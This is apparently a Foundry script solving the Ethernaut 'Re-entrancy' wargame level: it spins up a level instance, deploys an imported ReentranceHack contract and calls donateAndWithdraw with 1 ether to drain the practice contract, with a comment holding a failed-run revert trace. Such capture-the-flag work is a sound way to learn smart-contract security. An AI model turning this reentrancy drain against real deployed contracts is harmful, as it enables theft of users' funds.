// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

/*
*
*  [7596] Ethernaut::createLevelInstance(Level: [0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb]) 
    │   ├─ [2327] Level::createInstance(Player: [0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266]) 
    │   │   └─ ← "EvmError: Revert"
    │   └─ ← "EvmError: Revert"
    └─ ← "EvmError: Revert"

Error: 
Script failed.
*
*/

import {console} from "lib/forge-std/src/Script.sol";
import {EthernautScript} from "./Ethernaut.s.sol";
import {ReentranceHack} from "../src/10_Re-entrancy/Re-entrancyHack.sol";

interface Instance {
    function donate(address) external payable;

    function withdraw(uint) external;
}

contract LevelScript is EthernautScript {
    address level = 0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.startBroadcast(key);
        // vm.deal(player, 100 ether);
        instance = Instance(createLevelInstance(level, 0 ether));
        console.log("-> instance:", address(instance));
    }

    function hack() internal {
        ReentranceHack reentranceHack = new ReentranceHack(payable(address(instance)));
        reentranceHack.donateAndWithdraw{ value: 1 ether}();
    }
    function run() public {
        hack();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
// forge script ./script/10_Re-entrancy.s.sol
